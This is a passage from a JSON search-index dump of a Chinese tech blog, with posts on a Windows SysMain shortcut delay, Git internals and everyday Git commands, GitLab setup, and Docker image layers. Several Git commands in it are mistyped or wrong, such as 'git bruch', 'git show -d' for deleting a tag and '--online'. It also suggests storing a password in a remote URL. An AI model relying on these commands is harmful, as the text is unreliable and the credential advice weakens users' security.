https://paper.seebug.org/792/"},{"title":"Windows快捷键延时","date":"2020-05-22","updated":"2024-03-19","path":"2020/05/22/Windows快捷键延时/","text":"在windows上设置快捷键打开终端总会有莫名其妙的延时，按下快捷键终端会延迟 3 秒才打开。终于找到了解决办法,这是某些版本的 windows 上普遍存在的的一个 bug。 直接按 Win 键，搜索「服务」并打开，找到 sysMain，禁用它并重启电脑可解决。 这个服务如果找不到，就找它的旧名 superFetch，此服务其实是针对机械硬盘的缓存服务，对固态没用，可以放心禁用掉。"},{"title":"Git对象","date":"2020-05-17","updated":"2024-03-19","path":"2020/05/17/Git对象/","text":"git先把文件放在暂存区 然后就可以git update-index xxx.txt来生成一个index索引，注意这种生成方式是先把数据对象存储到objects数据库中，然后再生成索引 如果xxx.txt是之前已经通过git hash-object -w写入到objects数据库中的话，生成索引的命令就是下面的，其中--add参数表明这个文件是第一次被加入暂存区的 12git update-index --add --cacheinfo 100644 \\ 83baae61804e65cc73a7201a7252750c76066a30 test.txt 最后git write-tree来生成树对象 git file-ls -s 查看暂存区 https://gitee.com/progit/9-Git-内部原理.html#底层命令-(Plumbing)-和高层命令-(Porcelain)"},{"title":"git学习","date":"2020-05-17","updated":"2024-03-19","path":"2020/05/17/git学习总结/","text":"https://www.w3cschool.cn/lvmihi/domnuozt.html 版本控制的优势 协同修改 多人协同工作 数据备份 保存数据以及历史版本 版本管理 SVN 增量式管理，Git 文件系统快照 权限控制 对开发人员进行权限控制，Git 还可对代码进行审核 历史记录 查看修改人、修改时间、修改内容、日志信息 分支管理 允许多线程推进同一个任务，提高效率 Git 与 Github 关系 其实 Git 就是一个同步工具，而 Github 就是一个代码仓库 + 程序员交友网站，主要是下载 Git 来进行同步。 Git 与 Svn 区别 SVN 优点： 单一服务器，服务器保存所有文件的修订历史、每个人都可以看到项目中其他人在做什么，管理员可以轻松掌握每个开发者的权限。便于服务器管理，增量式管理，每次的历史记录只保存差异。 缺点： 如果服务器宕机，历史记录丢失，只有电脑保存最新版，无法协同工作。并且有丢失数据的风险。 SVN无法接受未授权的人提交的代码。这个特点适用于开源社区管理代码。 Git 与 Linux 命令完全兼容 完全分布式，客户端并不只是提取最新版本的文件快照，而是把代码仓库完整的镜像下来，每一台电脑都是一台服务器，保存着整个项目的历史版本。因为压缩算法很厉害，所以储存能力很强。 对团队外开发者提交的代码进行审核----Git独有操作。 分布式版本控制系统，存放的不是差异，而是存放的索引（保存所有版本），即使断网也可以进行开发，因为版本都保存在本地。 尽可能添加数据而不是删除或修改数据，每次提交都会提交一个新的版本，不会删除旧的版本。 分支操作非常流畅 Git 安装 官网地址：https://git-scm.com/ 自己根据系统版本下载对应的版本，Windows，Linux，Unix Git 初始化 参数说明： 整个系统：system 当前用户：global 当前项目：留空,不需要参数 设置用户名 1git config --global user.name &#x27;username&#x27; 设置用户邮箱 1git config --global user.email &#x27;useremail&#x27; 删除配置信息 12git config --global --unset user.namegit config --global --unset user.email 在创建的仓库目录中做初始化 1git init 初始化后，会在文件夹中创建一个.git的隐藏文件夹，文件结构如下： 查看 git 状态 1git status 链接 Github 1git remote add origin githublink 删除仓库 直接将 .git 文件夹删除即可 1rm -rf .git 目录结构 工作区 暂存区 Staged Aera 版本库区 Git 代码托管中心 局域网环境 GitLab 服务器 外网环境 GitHub 码云 Git 本质（理解即可，讲存储原理） git核心本质上是一个键值对数据库。可以向该数据库插入任意类型的内容，它会返回一个键值，通过该值可以在任意时刻再次检索该内容。 通过 git hash-object 命令会生成一个键值对 key(hash):value(文件内容) 的对象，存放到 .git/object 当中。 1echo &#x27;test content&#x27; | git hash-object -w --stdin -w 指定 hash-object 命令存储数据对象：如不指定此选项，仅返回键值而不会进行写入 – stdin (standard input) 指定从 input 中读取内容，如果不指定该选项，则需要指定文件路径 执行命令后，会在 .git 中的 object 多出来一个存储记录 1.git/object/d6/70460b4b4aece5915caf5c68d12f560a9fe3e4 d6校验，余下38个字符作为文件名，使用的时候后需要将二者合并 用 cat 命令查看内容 1git cat-file -p d670460b4b4aece5915caf5c68d12f560a9fe3e4 用 cat 命令查看类型，返回 blob 类型 1git cat-file -t d670460b4b4aece5915caf5c68d12f560a9fe3e4 所以 git 对象是键值对（key是hash，而value是内容） 将文件写入存储区 1git hash-object -w ./test.txt 树对象 因为每次使用 -w 只会推送一个文件到本地数据库，并不能将整个项目推进数据库，那么就需要引入另外一个概念，树对象。 树对象 (tree object), 它能解决文件名保存的问题，也允许我们将多个文件组织到一起。 Git 以一种类似于 Unix 文件系统的方式存储内容。所有内容均以树对象和数据对象(git 对象)的形式存储，其中树对象对应了 Unix 中的目录项，数据对象对应文件内容。一个树对象包含一条或多条记录。一个树对象也可以包含另外一个树对象。 构建树对象 可以利用 update-index; write-tree; read-tree 等命令构建树对象并推入暂存区 创建文件 1echo &quot;test v1&quot; &gt; test1.txt 将文件推送到库 1git hash-object -w test1.txt 将文件放入暂存区 1git update-index--add--cacheinfo 10644\\915c628f360b2d8c3edbe1ac65cf575b69029b61 test1.txt 文件模式： 123100644，表明这是一个普通文件100755，表明这是一个可执行文件120000，表示一个符号链接 –add 选项： ​ 此文件之前并没有在缓存区，首次需要add添加 –cacheinfo选项： ​ 因为将要添加的文件位于 Git 数据库中，而不是位于当前的目录下，所以需要–cacheinfo 生成树对象 1git write-tree 在生成树对象之前，可以不断的将文件加入项目暂存区，当认为可以成为一个版本的时候，执行 git write-tree 命令将树对象生成。 更新同名文件到暂存区（不需要加 --add 参数） 1git update-index --cacheinfo 10644\\915c628f360b2d8c3edbe1ac65cf575b69029b61 test1.txt 执行顺序： 12创建文件 -&gt; 推入库拿到Hash -&gt; 推入暂存区 -&gt; 循环直到版本完成 -&gt; 更新树对象到库git update-index --add filename # 相当于生成对象并将对象推入暂存区 将旧的树对象从版本库中拿出来保存到暂存区中 1git read-tree --prefix=bak 旧的树对象hash值 查看暂存区命令 1git ls-files -s 查看树对象 1git cat-file -p master^&#123;tree&#125;(或者是树对象的hash) GIT对象为文件的修订版本、树对象代表项目的修订版本 提交对象 1echo &#x27;fist commit&#x27; | commit-tree 当前树对象hash -p 父对象hash 可以通过 commit-ree 命令创建一个提交对象，需要指定一个树对象的 SHA-1 值，以及该提交的父提交对象（如果有的话，第一次将暂存区做快照就没有父对象），让同一个树对象保存多个历史版本 Commit 是最终版本，存在于库，链式结构，保存所有记录，也是我们最终需要访问的 Tree 是存在暂存区的，是每次版本的快照，Commit 只是将 Tree 进行封装，将作者、时间、备注、父对象添加进去。 Git 高级命令 添加文件 12git add filenamegit add directory 可以将文件放入暂存区，执行顺序参考原理（工作区文件 -&gt; 在库中生成Git对象 -&gt; 推送到暂存区） 只要是文件被修改，项目被推送到暂存区，那么就会生成一个对应 Git 对象，而缓存区的文件则是被覆盖 相当于执行了底层命令 12git hash-object -w filename（有多少文件，就执行了多少次，将文件放入版本库）git update-index （将文件放入缓存区） 推送到版本库 1git commit -m &quot;提交描述&quot; 同时在版本库中生成树对象和提交对象，并不会清空暂存区，只有提交 commit 才会生成树对象和提交对象 相当于执行了底层命令 12git write-tree（生成树对象）git commit-tree（生成版本库对象） 提交文字比较多的注释： 1git commit 不加 -m 参数直接使用 git commit 命令，可以直接进入 vi 编辑器，写入篇幅比较多的注释 跳过暂存区直接commit： 1git commit -a 如果对已经在版本库中有快照的文件，在工作区进行修改，不想再用 git add 命令更新暂存区，可以使用 -a 参数直接提交到版本库。没有被跟踪的文件无法使用 -a 查看文件的状态 1git status 文件状态分为两种，已跟踪和未跟踪，已跟踪又分为三种状态：已暂存、已修改、已提交 未跟踪 ​ 表示没有加入暂存区，也不在版本库中有快照，还处于工作区，任意修改都不会对Git有影响，也不会有记录 已跟踪（已有快照文件） 已暂存 表示生成Git对象，推送到暂存区 已修改 表示生成Git对象后，文件已经在暂存区，又对本地文件进行修改，此时如果想要提交，需要再次推送到暂存区更新文件 已提交 表示将暂存区文件推送到版本库，生成历史版本 查看已修改内容差别命令： 当有文件处于已修改状态，使用 git diff 命令可以查看文件内容和修改之前的对比。比较工作区 与暂存的(git add 后)的差别,一个文件可以在commit之前多次add 1git diff 比较暂存区文件 与上一次commit 的差别 1git diff --cache || --staged 比较工作区与之前版本库中的文件 1git diff HEAD hash 结尾可以带文件名只比对单独的文件 工作区删除文件 如果在工作区删除了文件，用 git status 会发现文件已被删除，要用 git add 和 git commit 重新提交，提交后，版本库只会生成一个新的没有该文件的版本，但是文件的 Git 对象还是会存在。因为 Git 会保存所有的历史版本，所以如果以后想要回滚到之前的版本，则会恢复该文件。 1git rm filename # 也可以用这个命令直接删除提交一条龙 相当于 rm + git add 两个命令，最后只需要 git commit 提交到版本库即可 工作区修改文件名 和删除文件一样，本质上就是源文件删除，创建一个新名字的文件。同样需要 git add 命令将文件添加到暂存区，再 commit，git 同样提供了命令进行修改名称并自动添加到暂存区 1git mv original_filename new_filename 查看提交记录 1git log 可以查看所有文件被提交到版本库时候的详细信息，可以用下方代码查看简要信息： 123git log --pretty=onelinegit log --onelinegit reflog git reflog 可以显示 HEAD@{1} 字样，自动计算你的指针 查看项目分叉历史 1git log --online --decorate --graph --all Git 分支操作 使用分支意味着不影响主程序的稳定性，再重新复制一份出来，然后在这个复制版本中进行开发。Git 分支模型极其的高效轻量。 Master 为默认主分支，其他分支都是从Master中分离出来的。分支就是指向最新提交对象的指针。 分支的本质就是一个提交对象，HEAD 是一个指针，它默认指向 Master 分支，切换分支其实就是让 Head 指向不同的分支。 最好不要再 Master 上进行操作，所有操作都要在分支上进行，然后合并到 Master 上边。 创建分支： 1git bruch branch_name 可以创建一个新的分支。会在当前所在的提交对象上创建一个指针 切换分支： 1git checkout branch_name 注意：切换分支会改变你的工作目录中的文件，所以再每次切换分支前，git status 查看一下是否都被提交，如没有则需要提交保存一下当前分支，否则未保存的文件会遗留到切换到的分支中。造成分支污染。 切换分支会对工作区实际文件、暂存区、HEAD 进行改变。 新建一个分支并且同时切换到该分支 1git checkout -b branch_name 相当于 12git branch branch_namegit checkout branch_name 在之前的提交对象上新建一个分支，实现历史回滚 1git branch name commitHash 可以利用 log 查看分支hash，然后直接从之前的版本开启分支 查看分支列表 1git branch 删除分支 12git branch -d branch_name # 删除已合并的分支git branch -D branch_name # 强制删除未合并的分支 不可以删除当前所在分支 查看项目分叉历史 1git log --online --decorate --graph --all 查看分支最后一次提交 1git branch -v 合并分支 快速合并分支 1git merge branch_name 最后一次提交已经修改好的 hotfix 分支，然后切换到主分支，然后用 merge 命令合并该分支到主分支。测试完成后用 git rm 删除已经合并过的 hotfix 分支。 快速合并图解： 如果之前在 Master 分支上开过其他分支，那么这时候，其他分支已经过期，因为这些分支是从Merge前引出的分支，所以，这些分支并没有更新到Master的最新版本。用了 merge 命令后，会提示需要手动更改，将冲突的文件修复，然后用 git add 和 git commit 提交到版本库中完成Merge，这种合并称为典型合并 查看合并到当前分支的列表 1git branch --merged 如果出现列表，代表该分支已经合并，可以进行删除 查看未合并的分支列表 1git branch --no-merged 如果出现在这个列表中，应该考虑是否需要合并分支 Git Merge 的三种方式： 快速合并 1git merge branch_name 不会显示 feature，只保留单条分支记录。fast-forward方式合并， feature 的提交历史混入到 master 中 禁止快速合并 1git merge --no-ff branch_name # 不使用fast-forward方式合并，可以保存你之前的分支历史。能够更好的查看 merge历史，以及branch 状态。推荐这种 使用squash方式合并 1git merge --squash branch_name –squash选项的含义是：本地文件内容与不使用 --squash 的合并结果相同，但是不提交、不移动HEAD，因此需要一条额外的commit命令。其效果相当于将 feature 分支上的多个commit合并成一个，放在 Master 分支上，原来的 Feature commit 历史则没有拿过来。 用 log 感觉更清晰一些， add fa 是用的 -ff 快速合并，我们并不知道这个 commit 其实是从分支上过来的，git 只是做了一个 HEAD 移动，而 add fb 是用 --no-ff 合并的，可以清楚看到这个是分支，并且在 Master 主线上我们做了一个合并的图示。 Rebase 和 Merge 区别 正常来说，如果 feature 这个 branch 是从 M2 开发的，那么在主线 Master 已经推进到 M3 时，需要进行 Merge ，我们只会多出一个 Merged Commit。 如 M3 - Merged Commit with Feature 但是如果用了 Rebase 方式进行合并的话， 在 Feature 分支中，会在 M2 的基础上，自动补你当前代码到 M3，然后合并你的 F1 。结构如下 M3-F1 之后你的 Feature 分支可以在最新的主线基础上再继续开发到 F2，当开发完成时，我们要将 F2 合并到 Master 中，此时再切换到 Master 分支再进行 Rebase 合并，主线分支记录则会变成 M1-M2-M3-F1-F2，将程序所有的改动在主线上一条线清晰的延续。 总结：Rebase 更能体现项目的过程， Merge 更关注历史记录 官方建议可以在自己本地进行 Rebase，但是多人团队中的 Master 中最好不要用 Rebase 方式进行合并。会造成代码的混乱。 Do not rebase commits that exist outside your repository and that people may have based work on. 官方也给了解释原因：https://git-scm.com/book/en/v2/Git-Branching-Rebasing 配别名 Git 并不会在你输入部分命令时像 Linux 一样自动推断你想要的命令，可以使用 git config 来为长命令配上别名 1git config --global alias.co &quot;commit&quot; 当想要 commit 的时候，就可以直接输入 git co 实例1： 正在开发某网站 为了实现某个需求，创建一个分支 在这个分支上开展工作 正在此时，需要处理一个严重问题，需要紧急修复，你将按照如下方式来处理 切换到你的线上分支 为这个紧急任务新建一个分支，并且进行修复 在测试通过之后，切回线上分支，然后合并这个修补分支，最后将改动推送到线上分支。 切换回最初的工作分支，继续工作。 Git 存储 当所在项目已经工作了一段时间，需要紧急切换到其他分支，但本分支的任务没有完成，我们可以将本分支的工作储存到栈中。命令如下，本质上还是提交，但是不保存在提交记录中。 Git 存储 1git stash Git 存储还原 1git stash apply 当任务完成时，切回本分支，可以使用下方命令还原状态，但是栈中还是会保留之前的存储对象。切回本分支时，最好再次查看一下状态 git status，然后再还原存储的任务。 查看存储 1git stash list 当前任务保存在栈中，存储对象名为 stash@{0} ，大括号中为存储顺序编号 还原指定存储 1git stash apply stash@&#123;2&#125; # 如果不指定一个储藏，Git认为指定的是最近的储藏 删除栈中的存储 1git stash drop stash@&#123;0&#125; 还原并删除栈中的存储 1git stash pop # 最好在只有一个存储的情况下 还原文件 还原工作区文件 12git checkout --filenamegit resotre filename # 新版本推荐使用 当在工作区做了文件修改，但是文件未被上传到暂存区或版本库中，可以用以上命令来还原文件 还原暂存区文件 12git reset HEAD filenamegit restore --staged filename # 新版命令 版本库 1git commit --amend 当我们想要对上一次的提交进行修改时，我们可以使用git commit –amend命令。git commit –amend既可以对上次提交的内容进行修改，也可以修改提交说明。 这个命令可以会将暂存区的文件进行提交，如果上次提交到的版本库中的文件或注释有问题，使用该命令后，可以在快照保持不变的情况下，修改之前提交的信息。 如： 123git commit -m &#x27;modify comment&quot;git add forgotten_filesgit commit --amend 则实现了修改注释，并添加文件的操作。 Reset 命令 reset 移动 HEAD 指针，HEAD 可以是 hash值，~代表上一个指针 1git reset --soft HEAD~ 与 checkout 不同，reset 移动整个分支，而 checkout 只是移动 HEAD 指针，它本质上是撤销了上一次的 git commit 命令。当再次运行 git commit 时， Git 会创建一个新的提交，并移动 HEAD 所指向的分支来使其指向该提交。 当使用 reset 时候，其实就是把该分支移动回原来的位置，而不会改变索引区和工作目录，而这个就是 git commit --amend 的原理。 与 soft 不同的是，–mixed 参数会更改暂存区，还原为之前的版本 1git reset [--mixed] HEAD~ # 默认为 --mixed 可不填写 只有 --mixed 模式可以跟文件名或路径，如果加了路径，则不会对HEAD进行跳转，只会撤销暂存区文件。因为 HEAD 指向一个分支，而分支代表一个提交对象（包括树对象，多个Git 对象）所以如果加了路径的话，不可能移动 HEAD。所以只更改暂存区。 –hard 既会更改暂存区也会更改工作区，还原为之前的版本 12git reset --hard HEAD~git reset --hard hash 注意： --hard 标记是 reset 命令唯一危险的用法，它也是 Git 会真正销毁数据的仅有的几个操作之一。 --hard 会强制覆盖工作目录和暂存区的文件。如果文件被提交，我们还可以从数据库中找到 Git 对象进行还原，否则如果未提交的话，该文件彻底消失。 –hard 与 checkout 区别： ​ \\1. checkout 只动 HEAD， --hard 动 HEAD 而且带着分支一起走 ​ \\2. checkout 对工作目录是安全的， --hard 强制覆盖工作目录 需要测试一下，–HARD 跳回去会恢复已提交的文件吗？ 数据恢复 可以在 ./git/logs/HEAD 查看所有变更 HEAD 的记录，如果用 --hard 硬重置到其他分支，造成文件丢失的情况，可以改变 HEAD 硬重置回之前的分支来恢复文件 1git reflog # 查看所有变更 HEAD 的记录 或者用 1git branch recover-branch branch_hash 重新创建一个分支，指向自己之前的分支，就可以恢复文件了。这种方法更为常用。 TAG - 标签 git 可以给历史中的某一个提交打上标签，一般用标签来标注版本号 查看标签 12git tag # 列出所有tag标签git tag -l 1.8.5* # *为通配符，列出1.8.5xxxxxx之类的所有tag 创建标签 12git tag v1.4 # 标注最后一次提交对象git tag v1.4 commithash # 标注指定提交对象 查看特定标签 1git show v1.0 删除标签 1git show -d v1.0 检出标签 1git checkout v1.0 在检出标签模式下，会处于头部分离状态，可以查看当前分支的状态，但是最好不要commit，如果此时进行了提交，标签不会发生变化，新提交也不会属于任何分支，并且无法访问。除非访问确切的Hash。 因此，如果想要修改，最后使用 git branch -b branch_name 来创建分支进行修改 与Github联动，远程仓库 生成 SSH key 本地生成 rsa 文件 1ssh-keygen -t rsa -C &quot;your_email@youremail.com&quot; 然后复制到 Github 中 https://github.com/settings/keys 验证 1ssh -T git@github.com 配置 Github 配置 Git 用户名和邮箱与 Github 一致 设置用户名 1git config --global user.name &#x27;username&#x27; 设置用户邮箱 1git config --global user.email &#x27;useremail&#x27; 也可以在 .git/config 设置私有项目用户名和密码，origin可以是项目名 12[remote &quot;origin&quot;] url = https://username:password@github.com/username/responstory.git 在创建的仓库目录中做初始化 1git init 创建远程仓库 - Github 添加一个新的远程 Git 仓库，同时指向一个你可以轻松引用的简写 1git remote add origin githublink 显示远程仓库使用的 Git 别名与其对应的 URL 1git remote -v 查看某一个远程仓库更多的信息 1git remote show [remote-name] 推送到远程仓库 1git push origin master 提交代码到原厂仓库 Github Master / 可以把 master 换成你想要推送的任何分支， origin 是别名（项目名），推送完会生成一个远程跟踪分支 克隆仓库 1git clone gitlink 如果是先从 Github 创建了仓库并在 Github 做了仓库初始化，可以用 clone 命令下载远程仓库同步本地仓库。当 clone 后，本地分支 master 和远程同部分支是有同步关系的。 效果： 完整把远程库下载到本地 创建origin远程地址别名 初始化本地库 邀请协作者 同步分支到远程 分支是用来将特性开发绝缘开来的。在你创建仓库的时候，master 是&quot;默认的&quot;分支。在其他分支上进行开发，完成后再将它们合并到主分支上。 创建一个叫做&quot;feature_x&quot;的分支，并切换过去： 1git checkout -b feature_x 切换回主分支： 1git checkout master 的删掉分支： 1git branch -d feature_x 除非你将分支推送到远端仓库，不然该分支就是 不为他人所见的： 1git push origin &lt;branch&gt; 更新与合并 要更新你的本地仓库至最新改动，执行： 1git pull [远程地址别名][远程分支别名] pull 命令其实就是两个命令的合集以在你的工作目录中 获取（fetch） 并 合并（merge） 远端的改动。 原理： 1git fetch [远程地址别名][远程分支别名] 当协作者 push 内容到 Github，可以用 fetch 命令将远程仓库当做一个分支下载到本地，可以用 git branch -vv 查看远程库跟踪分支，然后用 checkout origin/master 切换的远程跟踪分支查看更改内容。 测试完成后，git checkout master 切换回 master 分支用 merge 命令同步远程跟踪分支。 1git merge [远程地址别名][远程分支别名] 解决冲突 当 push 文件的时候，Git 会提示有它人已经推送了同样的文件，需要解决冲突才可以进行 Push 这时候，需要先用 pull 命令拉去最新版文件，然后 Git 会自动进入 Merge 模式，用 Vi 编辑器修改文件，修改冲突。git add 添加到暂存区、重新 Commit，然后再次进行 push 即可。 远程团队协作 让远程协作人员 Fork 一份程序出来，然后进行 clone，在本地库进行更改，更改完成后，push 到远程库。之后通过 pull request 让领导审核一下，如果通过，就可以 Merge 到 Master 分支上。 Guitar Windows 图形化 Git 工具 Pycharm 使用 Git 同步 安装 Git 后打开 Pycharm - Setting 打开 Terminal 就可以运行 git init 命令初始化了 配置 Github 账号 Git 工作流 GitLab 安装配置局域网 Git 工作环境 https://about.gitlab.com/install/ 安装分 ce 社区版 和 ee 企业版，根据需要自己安装 配置GitLab站点Url GitLab默认的配置文件路径是 1/etc/gitlab/gitlab.rb 默认的站点Url配置项是： 1external_url &#x27;http://gitlab.example.com&#x27; 这里我将GitLab站点Url修改为 1http://git.ken.io # 也可以用IP代替域名，这里根据自己需求来即可 #修改配置文件 1sudo vi /etc/gitlab/gitlab.rb #配置首页地址（大约在第15行） 1external_url &#x27;http://网站地址&#x27; 初始化 Gitlab 1gitlab-ctl reconfigure 启动 gitlab 服务 1gitlab-ctl start 访问GitLab 12将设置的域名DNS解析到服务器IP，或者修改本地host将域名指向服务器IP。访问：http://网站地址"},{"title":"nginx惊群","date":"2020-05-17","updated":"2024-03-19","path":"2020/05/17/nginx惊群/","text":""},{"title":"docker镜像与分层","date":"2020-05-17","updated":"2024-03-19","path":"2020/05/17/docker镜像与分层/","text":"目录 *关于base镜像* 关于存储结构（About storage drivers） 先来创建一个自己的镜像 docker镜像的分层结构 容器的大小 修改时复制策略 copy-on-write (CoW) Copying makes containers efficient 关于base镜像 base 镜像有两层含义： 不依赖其他镜像，从 scratch 构建。 其他镜像可以之为基础进行扩展。 所以，能称作 base 镜像的通常都是各种 Linux 发行版的 Docker 镜像，比如 Ubuntu, Debian, CentOS 等。 base 镜像提供的是最小安装的 Linux 发行版。 我们大部分镜像都将是基于base镜像构建的。所以，通常使用的是官方发布的base镜像。可以在docker hub里找到。比如centos： https://hub.docker.com/_/centos 点击版本可以看到github里的Dockerfile 12345678910FROM scratchADD centos-7-docker.tar.xz /LABEL org.label-schema.schema-version=&quot;1.0&quot; \\ org.label-schema.name=&quot;CentOS Base Image&quot; \\ org.label-schema.vendor=&quot;CentOS&quot; \\ org.label-schema.license=&quot;GPLv2&quot; \\ org.label-schema.build-date=&quot;20181205&quot;CMD [&quot;/bin/bash&quot;] ADD命令将本地的centos7的tar包添加到镜像，并解压到根目录/下。生成/dev,/proc/,/bin等。 我们可以自己构建docker base镜像，也可以直接使用已有的base镜像。比如centos。我们可以直接从docker hub上拉取。 拉取 1docker pull centos 查看 123# docker images centos REPOSITORY TAG IMAGE ID CREATED SIZEcentos latest 1e1148e4cc2c 2 months ago 202MB 可以看到最新的centos镜像只有200mb，是不是觉得太小了？这是因为docker镜像在运行的时候直接使用docker宿主机器的kernel。 Linux操作系统由内核空间和用户空间组成。 内核空间是kernel，用户空间是rootfs, 不同Linux发行版的区别主要是rootfs.比如 Ubuntu 14.04 使用 upstart 管理服务，apt 管理软件包；而 CentOS 7 使用 systemd 和 yum。这些都是用户空间上的区别，Linux kernel 差别不大。 所以 Docker 可以同时支持多种 Linux 镜像，模拟出多种操作系统环境。 需要注意的是： base镜像只是用户空间和发行版一致。kernel使用的是docker宿主机器的kernel。例如 CentOS 7 使用 3.x.x 的 kernel，如果 Docker Host 是 Ubuntu 16.04，那么在 CentOS 容器中使用的实际是是 Host 4.x.x 的 kernel。 ① Host kernel 为 4.4.0-31 ② 启动并进入 CentOS 容器 ③ 验证容器是 CentOS 7 ④ 容器的 kernel 版本与 Host 一致 关于存储结构（About storage drivers） 上文里展示了如何下载一个base镜像。我们通常是基于这份base镜像来构建我们自己的镜像。比如，在centos里添加一个nginx负载均衡。首先，得需要了解镜像的结构是什么。 官方文档： https://docs.docker.com/storage/storagedriver/ 先来创建一个自己的镜像 首先，base镜像是基于docker宿主机器kernel之上的Linux发行版。 现在，我们给这台机器安装一个vim，一个httpd. 基于Dockerfile来创建一个新的镜像。 我们的Dockerfile 1234FROM centos:7RUN yum install -y vimRUN yum install -y httpdCMD [&quot;/bin/bash&quot;] 含义： 基于centos7的base镜像构建 安装vim 安装httpd 执行bash 在当前目录下新建一个文件Dockerfile, 填充上述内容。然后执行 123456789101112131415# docker build -t ryan/httpd:v1.0 .Sending build context to Docker daemon 6.144kBStep 1/4 : FROM centos:7 ---&gt; 1e1148e4cc2cStep 2/4 : RUN yum install -y vim ---&gt; Using cache ---&gt; 74bdbea98f73Step 3/4 : RUN yum install -y httpd ---&gt; Using cache ---&gt; 17d8c4095dc4Step 4/4 : CMD /bin/bash ---&gt; Using cache ---&gt; f2b58b1192deSuccessfully built f2b58b1192deSuccessfully tagged ryan/httpd:latest -t 指定我们创建的镜像名称，镜像名称可以用组织/id:version的方式标记 最后一个参数是Dockerfile所在的路径., 表示当前目录 然后我们添加一个tag latest 1docker tag ryan/httpd:v1.0 ryan/httpd:latest 即给镜像ryan/httpd:v1.0标记为ryan/httpd:latest 构建完成之后，查看 12345# docker images | grep -E &#x27;(ryan|centos)&#x27;ryan/httpd latest f2b58b1192de About an hour ago 444MBryan/httpd v1.0 f2b58b1192de About an hour ago 444MBcentos 7 1e1148e4cc2c 2 months ago 202MBcentos latest 1e1148e4cc2c 2 months ago 202MB 可以运行我们创建的镜像： 1234# docker run -d --privileged=true -it ryan/httpd:v1.0 /usr/sbin/init48a4a128cd7b6924149cd97670919d4e2af6cb96c73c901af60d05fe4478225a# docker ps | grep ryan48a4a128cd7b ryan/httpd:v1.0 &quot;/usr/sbin/init&quot; 8 seconds ago Up 8 seconds 现在我们的基于原生base centos7的httpd服务器已经启动了。可以通过docker exec -it zealous_kirch /bin/bash来进入容器内部，查看启动httpd。 docker镜像的分层结构 我们可以查看镜像的历史，用上一步的镜像id f2b58b1192de 12345678# docker history f2b58b1192deIMAGE CREATED CREATED BY SIZE COMMENTf2b58b1192de About an hour ago /bin/sh -c #(nop) CMD [&quot;/bin/bash&quot;] 0B 17d8c4095dc4 About an hour ago /bin/sh -c yum install -y httpd 110MB 74bdbea98f73 About an hour ago /bin/sh -c yum install -y vim 133MB 1e1148e4cc2c 2 months ago /bin/sh -c #(nop) CMD [&quot;/bin/bash&quot;] 0B &lt;missing&gt; 2 months ago /bin/sh -c #(nop) LABEL org.label-schema.... 0B &lt;missing&gt; 2 months ago /bin/sh -c #(nop) ADD file:6f877549795f479... 202MB 启动镜像的时候，一个新的可写层会加载到镜像的顶部。这一层通常称为“容器层”， 之下是“镜像层”。 容器层可以读写，容器所有发生文件变更写都发生在这一层。镜像层read-only,只允许读取。 第一列是imageid, 最上面的id就是我们新创建ryan/httpd:latest. 下面几行都是我们dockerfile里定义的步骤堆栈。由此可以看出，每个步骤都将创建一个imgid, 一直追溯到1e1148e4cc2c正好是我们的base镜像的id。关于``的部分，则不在本机上。 最后一列是每一层的大小。最后一层只是启动bash，所以没有文件变更，大小是0. 我们创建的镜像是在base镜像之上的，并不是完全复制一份base，然后修改，而是共享base的内容。这时候，如果我们新建一个新的镜像，同样也是共享base镜像。 那修改了base镜像，会不会导致我们创建的镜像也被修改呢？ 不会！因为不允许修改历史镜像，只允许修改容器，而容器只可以在最上面的容器层进行写和变更。 Note: If you need multiple images to have shared access to the exact same data, store this data in a Docker volume and mount it into your containers. 容器的大小 创建镜像的时候，分层可以让docker只保存我们添加和修改的部分内容。其他内容基于base镜像，不需要存储，读取base镜像即可。如此，当我们创建多个镜像的时候，所有的镜像共享base部分。节省了磁盘空间。 对于启动的容器，查看所需要的磁盘空间可以通过docker ps -s 12345# docker run -d -it centos4b0df4bc3e705c540144d545441930689124ade087961d01f56c2ac55bfd986d# docker ps -s | grep -E &#x27;(ryan|centos)&#x27;4b0df4bc3e70 centos &quot;/bin/bash&quot; 23 seconds ago Up 23 seconds vigorous_elion 0B (virtual 202MB)b36421d05005 ryan/httpd:v1.0 &quot;/usr/sbin/init&quot; 32 minutes ago Up 32 minutes gracious_swirles 61.6kB (virtual 444MB) 首先启动一个base镜像用来对比 可以看到第一行就是base镜像centos，第2列的size是0和202MB, 0表示容器层可写层的大小，virtual则是容器层+镜像层的大小。这里对比可以看到一共202M,正好是最初centos镜像的大小。 第二行是我们自己创建的镜像。virtual达到了444MB。对比前面的history部分，可以发现这个数字是每一层大小之和。同时，由于共享base，其中的202M是和第一行的镜像共享的。 Sharing promotes smaller images When you use docker pull to pull down an image from a repository, or when you create a container from an image that does not yet exist locally, each layer is pulled down separately, and stored in Docker’s local storage area, which is usually /var/lib/docker/ on Linux hosts. You can see these layers being pulled in this example: 12345678$ docker pull ubuntu:18.0418.04: Pulling from library/ubuntuf476d66f5408: Pull complete8882c27f669e: Pull completed9af21273955: Pull completef5029279ec12: Pull completeDigest: sha256:ab6cb8de3ad7bb33e2534677f865008535427390b117d7939193f8d1a6613e34Status: Downloaded newer image for ubuntu:18.04 Each of these layers is stored in its own directory inside the Docker host’s local storage area. To examine the layers on the filesystem, list the contents of /var/lib/docker/. This example uses the overlay2 storage driver: 123456$ ls /var/lib/docker/overlay216802227a96c24dcbeab5b37821e2b67a9f921749cd9a2e386d5a6d5bc6fc6d3377d73dbb466e0bc7c9ee23166771b35ebdbe02ef17753d79fd3571d4ce659d73f02d96212b03e3383160d31d7c6aeca750d2d8a1879965b89fe8146594c453dec1ec45792908e90484f7e629330666e7eee599f08729c93890a7205a6ba35f5l The directory names do not correspond to the layer IDs (this has been true since Docker 1.10). Now imagine that you have two different Dockerfiles. You use the first one to create an image called acme/my-base-image:1.0. 12FROM ubuntu:18.04COPY . /app The second one is based on acme/my-base-image:1.0, but has some additional layers: 12FROM acme/my-base-image:1.0CMD /app/hello.sh The second image contains all the layers from the first image, plus a new layer with the CMD instruction, and a read-write container layer. Docker already has all the layers from the first image, so it does not need to pull them again. The two images share any layers they have in common. If you build images from the two Dockerfiles, you can use docker image ls and docker history commands to verify that the cryptographic IDs of the shared layers are the same. Make a new directory cow-test/ and change into it. Within cow-test/, create a new file called hello.sh with the following contents: 12#!/bin/shecho &quot;Hello world&quot; Save the file, and make it executable: 1chmod +x hello.sh Copy the contents of the first Dockerfile above into a new file called Dockerfile.base. Copy the contents of the second Dockerfile above into a new file called Dockerfile. Within the cow-test/ directory, build the first image. Don’t forget to include the final . in the command. That sets the PATH, which tells 